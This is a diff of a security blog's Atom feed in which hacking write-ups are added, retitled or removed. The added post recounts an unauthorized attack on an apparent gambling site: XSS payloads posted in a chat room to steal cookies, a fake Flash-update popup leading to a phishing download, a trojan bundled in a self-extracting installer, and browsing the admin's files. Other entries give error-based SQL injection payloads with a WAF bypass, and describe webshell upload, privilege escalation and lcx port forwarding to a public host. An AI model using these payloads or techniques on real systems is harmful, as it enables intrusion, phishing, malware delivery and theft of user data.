@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.se7ensec.cn/"/>
-  <updated>2019-12-07T07:15:27.342Z</updated>
+  <updated>2019-12-08T16:36:12.546Z</updated>
   <id>https://www.se7ensec.cn/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BC实战|从Xss到主机上线</title>
+    <link href="https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/"/>
+    <id>https://www.se7ensec.cn/2019/12/08/BC实战从Xss到主机上线/</id>
+    <published>2019-12-08T15:10:24.000Z</published>
+    <updated>2019-12-08T16:36:12.546Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>要保持学习的好习惯，这次平时学的就用上了。</p></blockquote><h1 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h1><a id="more"></a><p>前几天收到一封邮件，内容是这样的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/1.png" alt="1"></p><p>你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。</p><p>加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="官网截图"><a href="#官网截图" class="headerlink" title="官网截图"></a>官网截图</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/2.png" alt="2"></p><p>信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/3.png" alt="3"></p><p>想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。</p><h2 id="职业习惯："><a href="#职业习惯：" class="headerlink" title="职业习惯："></a>职业习惯：</h2><p>看见框就想叉，一发xss payload打过去：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=XSSURL&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/4.png" alt="4"></p><p>wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">相关介绍</a>，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。</p><p>再吃我一发：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/5.png" alt="5"></p><p>叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/6.png" alt="6"></p><h1 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a>Flash钓鱼</h1><p>既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：<a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">传送门</a>。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>一个免费空间，一个免费域名（域名可以搞一个 <a href="http://www.flashxxx.tk" target="_blank" rel="noopener">www.flashxxx.tk</a> 这种的，可信度比较高），一个可以正常上线的马子。</p><p>然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/7.png" alt="7"></p><h2 id="关于马子"><a href="#关于马子" class="headerlink" title="关于马子"></a>关于马子</h2><p>可以做到运行正常安装文件的同时运行马子，骚姿势：<a href="https://www.baikesec.com/webstudy/still/77.html" target="_blank" rel="noopener">自解压捆绑文件的利用</a></p><p>为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。</p><h2 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h2><p>由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/8.png" alt="8"></p><h2 id="一切就绪"><a href="#一切就绪" class="headerlink" title="一切就绪"></a>一切就绪</h2><p>万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/9.png" alt="9"></p><p>页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页）</p><p>不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。</p><h2 id="成功上线："><a href="#成功上线：" class="headerlink" title="成功上线："></a>成功上线：</h2><p>这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/10.png" alt="10"></p><p>看一会对面在干哈：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/11.png" alt="11"></p><p>这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/12.png" alt="12"></p><p>打开了一个账面，这流水咱也看不懂：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/13.png" alt="13"></p><p>再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/14.png" alt="14"></p><p>F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/15.png" alt="15"></p><h1 id="点到为止："><a href="#点到为止：" class="headerlink" title="点到为止："></a>点到为止：</h1><p>不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/16.png" alt="16"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;要保持学习的好习惯，这次平时学的就用上了。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&quot;故事的起因&quot;&gt;&lt;a href=&quot;#故事的起因&quot; class=&quot;headerlink&quot; title=&quot;故事的起因&quot;&gt;&lt;/a&gt;故事的起因&lt;/h1&gt;
+    
+    </summary>
+    
+    
+      <category term="APT相关" scheme="https://www.se7ensec.cn/categories/APT%E7%9B%B8%E5%85%B3/"/>
+    
+    
+      <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
+    
+  </entry>
   
   <entry>
     <title>一处图片引用功能导致的XSS</title>
@@ -42,11 +68,11 @@
   </entry>
   
   <entry>
-    <title>菠菜站实战Bypass安全狗</title>
-    <link href="https://www.se7ensec.cn/2019/11/11/%E8%8F%A0%E8%8F%9C%E7%AB%99%E5%AE%9E%E6%88%98Bypass%E5%AE%89%E5%85%A8%E7%8B%97/"/>
-    <id>https://www.se7ensec.cn/2019/11/11/菠菜站实战Bypass安全狗/</id>
+    <title>BC实战|Bypass安全狗</title>
+    <link href="https://www.se7ensec.cn/2019/11/11/BC%E5%AE%9E%E6%88%98Bypass%E5%AE%89%E5%85%A8%E7%8B%97/"/>
+    <id>https://www.se7ensec.cn/2019/11/11/BC实战Bypass安全狗/</id>
     <published>2019-11-11T03:10:24.000Z</published>
-    <updated>2019-11-11T14:17:00.033Z</updated>
+    <updated>2019-12-08T15:57:06.571Z</updated>
     
     <content type="html"><![CDATA[<blockquote><p>学以致用。</p></blockquote><a id="more"></a><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>常规流程走一遍，发现一处标记信息已读的功能点比较可疑：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/1.png" alt="1"></p><p>抓包加单引号重放：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/2.png" alt="2"></p><p>可以看到单引号被转义了，看下闭合方式，问题不大，因为有回显，直接使用报错注入。</p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="获取下数据库用户"><a href="#获取下数据库用户" class="headerlink" title="获取下数据库用户"></a>获取下数据库用户</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127) or updatexml(1,concat(0x3a,user()),1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/3.png" alt="3"></p><h2 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h2><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127) or updatexml(1,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>, (schema_name),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">FROM</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/4.png" alt="4"></p><h2 id="Bypass安全狗"><a href="#Bypass安全狗" class="headerlink" title="Bypass安全狗"></a>Bypass安全狗</h2><p>掏出前段时间学到的打狗棒法（超长字符Bypass，这里类型不同，原理相同）：<a href="https://mp.weixin.qq.com/s/1cxlGvNWXmzkmyczXJMtvw" target="_blank" rel="noopener">传送门</a></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.11.11/5.png" alt="5"></p><p>后面的和常规报错没什么不同，就不啰嗦了，领会精神~</p><h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><p>渗透测试中习惯以开发者的角度考虑一个功能的实现，会更快的找到有效的切入点。</p><p>结合<code>BurpSuite</code>的<code>Intruder</code>模块中的<code>Grep-Match</code>功能使用，可以快速提取报错注入的结果。</p><p>超长字符不仅仅可以应用在Bypass安全狗注入，利用参数污染，XSS也是可以滴。</p>]]></content>
     
@@ -507,34 +533,6 @@
     
     
       <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>记一次渗透提权03服务器</title>
-    <link href="https://www.se7ensec.cn/2019/02/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%8303%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
-    <id>https://www.se7ensec.cn/2019/02/17/记一次渗透提权03服务器/</id>
-    <published>2019-02-17T13:00:17.000Z</published>
-    <updated>2019-12-05T17:10:21.110Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4jdR.png" alt="1"></p><blockquote><p>过渡。</p></blockquote><a id="more"></a><h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><p>站点是批量测注入的时候发现的，随手测了下后台就是admin，登陆进去发现有两处应该可以拿shell</p><h2 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h2><p>备份功能稳不稳定不知道，怕把站点搞死，最后还是通过备份成功getshell的 XD</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4QgL.png" alt="2"></p><h2 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h2><p>测试了修改文件类型，00截断，.asa、.cer….等无效，而且上传的文件名自动转换时间戳重命名，遂放弃。</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh40C8.png" alt="3"></p><p>不过有意思的是，右键源代码把编辑器揪出来了，开发把编辑器隐藏显示了，如下图（display:none改成on后即可显示，然鹅没有卵用，并不正常显示）</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4aHW.png" alt="4"></p><p>知道是eWebEditor的编辑器，编辑器后台地址：http:127.0.0.1/pluck%60edit/admin/login.asp，尝试了爆破，弱口令，默认备份mdb下载均无果也放弃了。（后来进去翻到账号就是建站公司的英文名字，密码加了个三位数，信息搜集对于爆破这一块还挺重要的）</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4b0w.png" alt="5"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进去大马（站点仅支持asp），可以直接执行cmd，就是权限很低</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4FIG.png" alt="6"></p><p>systeminfo直接看打了什么补丁，拿exp先怼怼看，复制下来补丁信息，扔进去 <a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">提权辅助</a>这个网页里比较下，可以使用 IIS6.0 的一个 exp，传到可读写目录里，我这里就是 C:\wmpub ，然后就用 IIS6.0.exe 执行命令，发现是system权限了，同样的方法添加一个管理员帐号。</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4SNg.png" alt="7"></p><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><p>由于主机在内网，开放的就是3389端口，我们只需要将主机的3389端口转发出来，就可以连接上去</p><p>端口转发工具：lcx （具体使用方法移步：<a href="http://www.cnblogs.com/lingerhk/p/4506308.html" target="_blank" rel="noopener">传送门</a>）</p><p>公网主机：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 2222 6666</span><br></pre></td></tr></table></figure><p>肉鸡：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网主机ip 2222 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>然后公网主机连接127.0.0.1:6666，发现连接失败，我丢。。。。（quser查询有一个前几天在线的管理，logoff踢掉了，然鹅还是上不去）</p><p><img src="https://t1.picb.cc/uploads/2019/02/17/Vh4XsX.png" alt="8"></p><p>就到这里吧。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;https://t1.picb.cc/uploads/2019/02/17/Vh4jdR.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;过渡。&lt;/p&gt;
-&lt;/blockquote&gt;
-    
-    </summary>
-    
-    
-      <category term="WEB安全" scheme="https://www.se7ensec.cn/categories/WEB%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
-    
-      <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
     
   </entry>
   
